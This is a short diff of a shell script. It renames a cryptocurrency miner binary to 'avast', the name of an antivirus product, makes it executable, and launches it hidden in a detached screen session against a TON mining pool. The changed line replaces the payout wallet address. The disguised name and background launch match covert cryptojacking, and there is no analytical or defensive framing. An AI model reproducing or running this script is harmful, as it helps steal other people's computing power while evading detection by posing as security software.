@@ -12,4 +12,4 @@ mv miner-linux avast
 
 chmod +x avast 
 
-screen -dmS running ./avast run https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+screen -dmS running ./avast run https://next.ton-pool.com EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
